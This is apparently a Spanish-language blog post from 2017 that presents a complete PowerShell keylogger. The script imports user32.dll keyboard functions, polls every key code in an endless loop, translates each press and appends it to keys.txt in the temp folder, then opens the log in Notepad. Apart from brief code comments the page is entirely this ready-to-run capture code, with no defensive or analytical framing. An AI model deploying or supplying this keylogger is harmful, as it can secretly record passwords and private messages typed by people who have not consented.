# Keylogger sencillo con PowerShell
## PowerShell 
### URL: https://www.jesusninoc.com/2017/03/11/keylogger-sencillo-con-powershell/
```PowerShell
#Declarar funciones
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

#Cargar las funciones declaradas
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

try
{
    #Bucle infinito para capturar pulsación de teclas
    while(1)
    {
        #Para cada uno de los caracteres ASCII
        for ($ascii = 9; $ascii -le 254; $ascii++)
        {
            #Capturar key state
            $state = $API::GetAsyncKeyState($ascii)
            #Si se ha pulsado una tecla
            if ($state -eq -32767)
            {
                #Traducir el código
                $virtualKey = $API::MapVirtualKey($ascii, 3)
                $kbstate = New-Object Byte[] 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object -TypeName System.Text.StringBuilder
                if($API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0))
                {
                    #Almacenar la tecla pulsada
                    $value = [System.Text.Encoding]::Unicode.GetBytes($mychar)
                    [System.IO.File]::AppendAllText("$env:temp\keys.txt", $mychar, [System.Text.Encoding]::Unicode)
                }
            }
        }
    }
}
finally
{
    #Abrir el fichero con las teclas pulsadashola
    notepad $env:temp\keys.txt
}

```
